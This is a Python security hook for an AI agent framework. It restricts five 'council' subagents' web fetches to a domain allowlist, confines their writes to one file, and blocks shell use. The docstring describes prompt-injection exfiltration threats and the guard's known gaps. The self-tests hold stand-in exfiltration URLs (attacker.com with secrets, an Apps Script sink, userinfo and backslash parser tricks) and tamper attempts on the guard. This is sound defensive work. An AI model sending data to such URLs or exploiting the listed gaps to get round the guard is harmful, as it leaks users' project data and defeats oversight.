#!/usr/bin/env python3
"""webfetch-egress-guard — PreToolUse hook closing Law 11 leg (c) for the COUNCIL (NORTH-STAR §11).

The 5 AI-Council agents hold the residual lethal trifecta: Read (project/owner
context) + WebFetch-in (untrusted web) + WebFetch-out (exfil to a crafted URL).
Web cannot be stripped — council-evidence-discipline MANDATES live search — so
this guard scopes the egress instead (design (c), decided 2026-06-10):

  For agent_type in the 5 council agents ONLY:
    1. WebFetch: http(s)-only AND the host must suffix-match the research
       ALLOWLIST below (dot-boundary). A crafted URL to an attacker domain,
       an IP literal, a userinfo trick (https://github.com@evil.com), or a
       lookalike (github.com.evil.com) is DENIED. This is the leg every
       May–Jun 2026 live breach exploited (Copilot Cowork OneDrive exfil,
       Meta bot IG takeover) — and the class of defense that holds:
       deterministic denial, not content filtering ("The Attacker Moves
       Second", arXiv 2510.09023 — all 12 published filter defenses broken).
    2. Write/Edit: ONLY a file literally named shared_reasoning.md (the
       deliberation protocol's one write surface). Everything else — repo
       files, hooks, settings, agent definitions, this guard itself — is
       DENIED, which also makes the guard tamper-proof against its subjects.
    3. Bash / NotebookEdit / Task / Agent: DENIED outright (not in the
       council toolset; hook-level defence-in-depth against a toolset
       misconfiguration, mirroring trifecta-guard's QUARANTINED_READERS).
  Everyone else (main session, discovery-scout, research-specialist, the
  specialists): UNTOUCHED — the open-research mandate stays open; their legs
  are handled by structure (read-only toolsets) + trifecta-guard.

HONEST SCOPE (recorded, not hidden):
  - Exfil to an ALLOWLISTED host remains possible in theory (e.g. query
    strings to a UGC platform). Accepted because the allowlisted services
    don't expose request logs/query strings to page authors (static hosting,
    platform analytics), so a crafted-URL payload has no attacker-readable
    sink; and trifecta-guard already denies credential reads to everyone, so
    the exfilable material is project context, not secrets.
  - Redirect chains from an allowlisted host are not re-checked (the hook
    sees the initial URL only).
  - WebSearch is not gated: queries go to the search provider, not to an
    arbitrary attacker host.
  - Council runs as SUBAGENTS carry agent_type; a hypothetical inline
    main-session "council" impersonation is out of scope (the main session
    is the trusted orchestrator).
  - FAIL-OPEN on unparseable stdin (a crashing security hook must not block
    all work — same rationale as trifecta-guard); matched council decisions
    are deterministic and type-guarded.

Allowlist policy: hosts come from docs/research/source-roster.md + the
sources the council agents' own bodies mandate (Reddit/HN/G2/Capterra/
Crunchbase/Product Hunt/Indie Hackers/Stack Overflow/X/LinkedIn...).
Extending it is a NORMAL, diff-visible repo edit (this file is itself
write-protected from council agents by rule 2). Keep it suffix-anchored
domains, never URL substrings.

Self-test:  python3 bin/hooks/webfetch-egress-guard.py --self-test
"""
import sys, os, json
from urllib.parse import urlsplit

COUNCIL = {"idea-sharpener", "user-pain-validator", "build-realist",
           "market-strategist", "devils-advocate"}

# Suffix-anchored allowlist (matches host == d  OR  host endswith "." + d).
ALLOWED_HOSTS = [
    # canon / docs
    "anthropic.com", "claude.com", "openai.com",
    # research / academic
    "arxiv.org", "openreview.net", "berkeley.edu", "continual-learning-bench.com",
    # code / packages
    "github.com", "github.io", "githubusercontent.com", "npmjs.com", "pypi.org", "python.org",
    # practitioner / community (council-evidence-discipline names these)
    "reddit.com", "ycombinator.com", "indiehackers.com",
    "stackoverflow.com", "stackexchange.com",
    "x.com", "twitter.com", "linkedin.com", "youtube.com",
    # market / product evidence (the council bodies name these)
    "g2.com", "capterra.com", "crunchbase.com", "producthunt.com", "techcrunch.com",
    # NOTE: google.com / apple.com REMOVED 2026-06-11 (Codex gate HIGH): broad programmable-
    # platform roots like google.com host attacker-rentable exfil sinks (script.google.com Apps
    # Script doGet(e) reads GET query params). Keep only specific non-executable research hosts.
    # blogs / newsletters (roster experts + platforms)
    "medium.com", "substack.com", "bearblog.dev", "wikipedia.org",
    "addyosmani.com", "augmentcode.com", "bruniaux.com", "cognition.ai",
    "dbreunig.com", "eugeneyan.com", "hamel.dev", "huyenchip.com",
    "karpathy.ai", "maven.com", "sh-reya.com",
]

WRITE_TOOLS = {"Write", "Edit"}
DENY_TOOLS = {"Bash", "NotebookEdit", "Task", "Agent"}
ALLOWED_WRITE_BASENAME = "shared_reasoning.md"


def host_allowed(url):
    """True iff url is http(s) to an allowlisted host (dot-boundary suffix match).
    Deny-by-construction for: other schemes, IP literals, userinfo tricks,
    lookalike domains, ports are fine (host parsing strips them), empty host."""
    if not isinstance(url, str) or not url:
        return False
    s = url.strip()
    # Defensive: reject backslashes (Python urlsplit and a WHATWG/Node fetcher disagree on
    # `https://evil.com\@github.com` — Codex gate parser-differential), interior whitespace, and
    # C0 control chars. If our parser and WebFetch's parser could differ, deny rather than guess.
    if "\\" in s or " " in s or any(ord(c) < 0x20 for c in s):
        return False
    try:
        parts = urlsplit(s)
    except ValueError:
        return False
    if parts.scheme.lower() not in ("http", "https"):
        return False
    host = (parts.hostname or "").lower().rstrip(".")
    if not host:
        return False
    # IP literals (v4 crude + v6) never match a domain allowlist — deny.
    if host.replace(".", "").isdigit() or ":" in host:
        return False
    return any(host == d or host.endswith("." + d) for d in ALLOWED_HOSTS)


def decide(data):
    """Return (deny: bool, reason: str). Pure; type-guarded."""
    if not isinstance(data, dict):
        return False, ""
    agent = data.get("agent_type")
    if agent not in COUNCIL:
        return False, ""                      # scope: council subagents only
    tool = data.get("tool_name", "")
    ti = data.get("tool_input")
    ti = ti if isinstance(ti, dict) else {}

    if tool in DENY_TOOLS:
        return True, (f"Law 11 (egress-guard): council agent '{agent}' may not use {tool} "
                      "(not in the council toolset; deliberation is read+web+shared_reasoning.md only)")
    if tool == "WebFetch":
        url = ti.get("url", "")
        if not host_allowed(url):
            return True, (f"Law 11 (egress-guard): council agent '{agent}' may only WebFetch "
                          "allowlisted research hosts — this URL is outside the allowlist "
                          "(crafted-URL exfil / untrusted-source defense). If the source is "
                          "legitimate, the OWNER can add its domain to bin/hooks/webfetch-egress-guard.py.")
    if tool in WRITE_TOOLS:
        # Confine to the PROJECT's shared_reasoning.md, not any file so named (Codex gate MED:
        # basename-only allowed /tmp/shared_reasoning.md + symlink-target writes). Require: exact
        # basename, resolved path inside the session cwd, and not a symlink (no write-through clobber).
        fp = ti.get("file_path", "")
        cwd = data.get("cwd") or os.getcwd()
        ok = False
        if isinstance(fp, str) and fp and os.path.basename(fp) == ALLOWED_WRITE_BASENAME:
            try:
                ap = fp if os.path.isabs(fp) else os.path.join(cwd, fp)
                cwd_real = os.path.realpath(cwd)
                ap_real = os.path.realpath(ap)
                inside = ap_real == cwd_real or ap_real.startswith(cwd_real + os.sep)
                ok = inside and not os.path.islink(ap)
            except Exception:
                ok = False
        if not ok:
            return True, (f"Law 11 (egress-guard): council agent '{agent}' writes ONLY the project's "
                          f"{ALLOWED_WRITE_BASENAME} (in the session cwd, no symlink) — denied {tool} "
                          f"of '{fp or '?'}' (also protects hooks/settings/agents from tampering)")
    return False, ""


def main():
    try:
        data = json.loads(sys.stdin.read())
    except Exception:
        print("{}")            # fail-open on unparseable stdin
        return 0
    try:
        deny, reason = decide(data)
    except Exception:
        print("{}")            # backstop fail-open (decide is type-guarded)
        return 0
    if deny:
        print(json.dumps({"hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "deny",
            "permissionDecisionReason": reason}}))
        return 0
    print("{}")
    return 0


# --------------------------- self-test ---------------------------
def _self_test():
    C = "devils-advocate"
    cases = [
        # --- council WebFetch: allow legitimate research ---
        ("council fetch github", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {"url": "https://github.com/anthropics/claude-code"}}, False),
        ("council fetch sub.domain (gist)", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {"url": "https://gist.github.com/x/abc"}}, False),
        ("council fetch old.reddit", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {"url": "https://old.reddit.com/r/SaaS/comments/x"}}, False),
        ("council fetch x.com status", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {"url": "https://x.com/trq212/status/123"}}, False),
        ("council fetch g2 reviews", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {"url": "https://www.g2.com/products/foo/reviews"}}, False),
        ("council fetch host:port", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {"url": "https://github.com:443/x"}}, False),
        # --- council WebFetch: deny the exfil/injection legs ---
        ("council fetch attacker.com", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {"url": "https://attacker.com/log?data=secrets"}}, True),
        ("council fetch lookalike", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {"url": "https://github.com.evil.com/x"}}, True),
        ("council fetch userinfo trick", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {"url": "https://github.com@evil.com/x"}}, True),
        ("council fetch IP literal", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {"url": "http://192.168.1.7/exfil"}}, True),
        ("council fetch ftp scheme", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {"url": "ftp://github.com/x"}}, True),
        ("council fetch empty url", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {}}, True),
        ("council fetch script.google.com (Apps Script exfil — google.com removed)", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {"url": "https://script.google.com/macros/s/AKfycbATTACKER/exec?d=PROJECT_CONTEXT"}}, True),
        ("council fetch backslash parser-differential", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": {"url": "https://evil.com\\@github.com/x"}}, True),
        # --- council writes: only the PROJECT's shared_reasoning.md (within cwd, no symlink) ---
        ("council write shared_reasoning.md in cwd", {"tool_name": "Write", "agent_type": C,
            "cwd": "/Users/x/proj", "tool_input": {"file_path": "/Users/x/proj/shared_reasoning.md"}}, False),
        ("council edit shared_reasoning.md (relative, in cwd)", {"tool_name": "Edit", "agent_type": C,
            "cwd": "/Users/x/proj", "tool_input": {"file_path": "shared_reasoning.md"}}, False),
        ("council write /tmp/shared_reasoning.md (right name, OUTSIDE cwd)", {"tool_name": "Write", "agent_type": C,
            "cwd": "/Users/x/proj", "tool_input": {"file_path": "/tmp/shared_reasoning.md"}}, True),
        ("council write settings.json", {"tool_name": "Edit", "agent_type": C,
            "tool_input": {"file_path": "/Users/x/claude-os/.claude/settings.json"}}, True),
        ("council tamper with this guard", {"tool_name": "Write", "agent_type": C,
            "tool_input": {"file_path": "/Users/x/claude-os/bin/hooks/webfetch-egress-guard.py"}}, True),
        ("council edit an agent definition", {"tool_name": "Edit", "agent_type": C,
            "tool_input": {"file_path": "/Users/x/claude-os/agents/devils-advocate.md"}}, True),
        ("council write decisions_log.md (orchestrator's file)", {"tool_name": "Write", "agent_type": C,
            "tool_input": {"file_path": "/Users/x/proj/decisions_log.md"}}, True),
        # --- council exec/fan-out: denied outright ---
        ("council Bash", {"tool_name": "Bash", "agent_type": C,
            "tool_input": {"command": "ls"}}, True),
        ("council NotebookEdit", {"tool_name": "NotebookEdit", "agent_type": C,
            "tool_input": {}}, True),
        # --- out of scope: everyone else untouched ---
        ("scout fetch anywhere (open research)", {"tool_name": "WebFetch", "agent_type": "discovery-scout",
            "tool_input": {"url": "https://random-blog.example.org/post"}}, False),
        ("research-specialist fetch anywhere", {"tool_name": "WebFetch", "agent_type": "research-specialist",
            "tool_input": {"url": "https://obscure-forum.net/thread"}}, False),
        ("main session fetch anywhere (no agent_type)", {"tool_name": "WebFetch",
            "tool_input": {"url": "https://anything.example.com/"}}, False),
        ("main session write anywhere", {"tool_name": "Write",
            "tool_input": {"file_path": "/tmp/x.txt"}}, False),
        # --- robustness ---
        ("council malformed tool_input", {"tool_name": "WebFetch", "agent_type": C,
            "tool_input": []}, True),  # empty url after type-guard -> deny (fail-closed for matched council fetches)
        ("council read allowed (not gated)", {"tool_name": "Read", "agent_type": C,
            "tool_input": {"file_path": "/Users/x/proj/notes.md"}}, False),
    ]
    ok = True
    for name, payload, expect in cases:
        got, reason = decide(payload)
        if got != expect:
            ok = False
        print(f"  [{'OK ' if got == expect else 'FAIL'}] {name}: deny={got} (exp {expect})"
              f"{'  -> ' + reason[:90] if got else ''}")
    import subprocess
    p = subprocess.run([sys.executable, os.path.abspath(__file__)],
                       input="not json", capture_output=True, text=True)
    fo = p.stdout.strip() == "{}"
    print(f"  [{'OK ' if fo else 'FAIL'}] fail-open on malformed stdin -> '{p.stdout.strip()}'")
    ok = ok and fo
    print(f"\nSELF-TEST: {'PASS' if ok else 'FAIL'}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(_self_test() if "--self-test" in sys.argv else main())
